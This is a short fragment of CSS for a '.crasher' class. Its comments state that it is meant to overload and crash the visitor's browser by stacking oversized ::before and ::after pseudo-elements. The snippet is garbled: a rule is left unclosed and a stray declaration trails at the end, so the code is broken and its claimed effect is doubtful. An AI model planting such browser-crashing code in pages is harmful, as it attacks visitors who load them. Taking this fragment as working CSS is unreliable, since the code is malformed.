    /* Create nested elements to overload the browser */
    .crasher div {
      position: relative;
      width: 100%;
      height: 100%;
      overflow: hidden;

    /* Add more nested elements to increase the load */
    .crasher div::before {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      width: 300%;
      height: 300%;
      background: red;
      z-index: -1;
    }
    .crasher div::after {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      width: 300%;
      height: 300%;
      background: blue;
      z-index: -2;
    }
    /* Add more nested elements to increase the load */

      position: absolute;
